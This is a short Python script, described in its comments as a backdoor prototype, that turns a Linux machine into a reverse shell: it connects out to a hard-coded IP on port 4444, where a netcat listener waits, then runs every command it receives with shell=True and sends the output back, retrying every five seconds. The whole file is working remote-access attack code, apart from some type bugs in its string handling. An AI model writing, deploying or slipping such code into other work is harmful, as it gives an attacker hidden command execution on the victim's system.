# This is a backdoor prototype that will ran by opening up a port by using nc -lvp 4444 (or any other port)
# User will then download this file on another linux device (I used raspberry pi as my hardware)
# On the other device, run python backdoorProto.py

import socket
import subprocess
import os
import time

def connect():
    # Sets up a TCP Environment 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            s.connect(('10.76.134.200', 4444)) # Test whether it connects
            s.send(str.encode("[!] User Detected: " + os.getcwd() + ": "))
    
            while True:
                data = s.recv(1024)
                usrcmd = data.decode("utf-8") # String of command sent from user
                if usrcmd.startswith("cd "):
                    try:
                        os.chdir(usrcmd[3:].strip()) # Changes directory in the shell
                        continue
                    except OSError as e:
                        s.send(str.encode("Error: " + str.encode(e.strerror) + "\n"))
                        continue
                proc = subprocess.Popen(data.decode('utf-8'), shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
                proc.stdout, proc.stderr = proc.communicate()
                output = proc.stdout + proc.stderr

                s.send(str.encode(output + os.getcwd() + ": "))

                if usrcmd == "end": # End connection
                    break

            s.close()
        except socket.error:
            print("Is not connecting")
            time.sleep(5) # Wait 5 seconds and attempt reconnecting



if __name__ == "__main__":
    connect()


